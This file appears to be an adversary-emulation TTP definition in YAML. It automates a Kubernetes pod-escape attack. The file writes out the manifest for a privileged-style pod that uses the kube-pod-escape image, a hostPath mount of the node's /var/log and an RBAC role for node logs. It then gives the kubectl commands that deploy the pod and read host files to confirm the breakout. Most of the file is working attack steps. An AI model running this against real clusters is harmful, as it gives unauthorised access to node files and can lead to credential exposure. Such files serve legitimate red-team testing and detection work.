---
name: escaper
description: |
  This TTP demonstrates how to escape from an insecure pod to a node in a Kubernetes
  cluster using the [escaper](https://github.com/danielsagi/kube-pod-escape) tool.
  The TTP creates an insecure pod with the escaper container image, which has the
  capability to mount the host's filesystem. Once the pod is running, it verifies
  access to a specified file on the host node to confirm the escape was successful.
args:
  - name: artifacts_dir
    description: The directory to store the downloaded tools.
    default: /tmp
  - name: eks_cluster
    description: Target k8s cluster is running on EKS.
    default: true
  - name: host_filepath
    description: The file path on the host to access.
    default: /var/log/host/cloud-init.log
  - name: insecure_container_image
    description: The container image to employ for the insecure pod.
    default: danielsagi/kube-pod-escape
  - name: target_cluster
    description: The target k8s cluster.
  - name: target_ns
    description: The target namespace in the cluster.
    default: default
  - name: target_region
    description: The region the target EKS cluster is in
    default: us-east-1
requirements:
  platforms:
    - os: linux
    - os: darwin
mitre:
  tactics:
    - TA0004 Privilege Escalation
    - TA0007 Discovery
  techniques:
    - T1552 Unsecured Credentials
    - T1087 Account Discovery
    - T1082 System Information Discovery

steps:
  {{ if .Args.eks_cluster }}
  - name: aws_connector
    description: This step invokes the setup_cloud_env action.
    ttp: //helpers/cloud/aws/validate-aws-env-configured.yaml
    args:
      region: "{{ .Args.target_region }}"

  - name: setup_kubeconfig_for_eks
    description: Set up kubeconfig for EKS cluster.
    ttp: //helpers/containers/k8s/setup-kubeconfig-for-eks.yaml
    args:
      cluster_name: "{{ .Args.target_cluster }}"
      cluster_region: "{{ .Args.target_region }}"
  {{ end }}

  - name: create_insecure_pod_manifest
    description: Create the manifest for the insecure pod.
    inline: |
      cat > {{ .Args.artifacts_dir }}/escaper.yaml <<EOF
      apiVersion: v1
      kind: ServiceAccount
      metadata:
        name: logger
      ---
      apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRole
      metadata:
        name: user-log-reader
      rules:
      - apiGroups: [""]
        resources:
        - nodes/log
        verbs: ["get", "list", "watch"]
      ---
      apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRoleBinding
      metadata:
        name: user-log-reader
      roleRef:
        apiGroup: rbac.authorization.k8s.io
        kind: ClusterRole
        name: user-log-reader
      subjects:
      - kind: ServiceAccount
        name: logger
        namespace: {{ .Args.target_ns }}
      ---
      apiVersion: v1
      kind: Pod
      metadata:
        name: escaper
        labels:
          app: escaper
      spec:
        serviceAccountName: logger
        containers:
        - name: escaper
          image: {{ .Args.insecure_container_image }}
          volumeMounts:
          - name: logs
            mountPath: /var/log/host
        volumes:
        - name: logs
          hostPath:
            path: /var/log/
            type: Directory
      EOF
    cleanup:
      inline: rm {{ .Args.artifacts_dir }}/escaper.yaml

  - name: create_insecure_pod
    description: Create the insecure pod in the target namespace.
    inline: kubectl create -f {{ .Args.artifacts_dir }}/escaper.yaml -n {{ .Args.target_ns }}
    cleanup:
      inline: kubectl delete -f {{ .Args.artifacts_dir }}/escaper.yaml -n {{ .Args.target_ns }}

  - name: verify_k8s_node_access
    description: Ensure that we have successfully broken out of the pod and can access the k8s node.
    inline: |
      # Wait for the pod to be in the Running state
      while [[ $(kubectl get pods -n {{ .Args.target_ns }} -l app=escaper -o jsonpath='{.items[0].status.phase}') != "Running" ]]; do
        echo "Waiting for pod to be running..."
        sleep 5
      done
      POD_NAME=$(kubectl get pods -n {{ .Args.target_ns }} -l app=escaper -o jsonpath='{.items[0].metadata.name}')
      kubectl exec -i $POD_NAME -- /bin/bash <<EOF
      if [[ -f {{ .Args.host_filepath }} ]]; then
        echo "Success: We can access the k8s node's cloud-init.log - here are the last 20 entries:"
        tail -n 20 {{ .Args.host_filepath }}
      else
        echo "Failure: We cannot access the k8s node's cloud-init.log"
        exit 1
      fi
      EOF
